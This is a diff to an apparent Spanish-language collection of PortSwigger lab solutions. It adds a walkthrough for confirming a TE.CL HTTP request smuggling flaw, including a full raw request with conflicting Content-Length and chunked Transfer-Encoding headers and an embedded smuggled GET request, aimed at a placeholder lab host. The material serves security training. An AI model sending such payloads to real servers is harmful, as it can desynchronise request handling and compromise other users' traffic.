@@ -518,6 +518,29 @@ GET /asd HTTP/1.1
 Foo: bar
 ```
 
+### [HTTP request smuggling, confirming a TE.CL vulnerability via differential responses](https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-te-cl-via-differential-responses)
+
+#### Solución:
+
+Enviar 2 veces la siguiente request (desactivar "Update Content-Length" de Burp Repeater y mantener los 2 saltos de línea del final):
+
+```
+POST / HTTP/1.1
+Host: LABID.web-security-academy.net
+Content-Length: 4
+Transfer-Encoding: chunked
+
+83
+GET /asd HTTP/1.1
+Host: LABID.web-security-academy.net
+Content-Length: 4
+Transfer-Encoding: chunked
+
+0
+
+
+```
+
 ---
 
 ## [OS command injection](https://portswigger.net/web-security/os-command-injection)
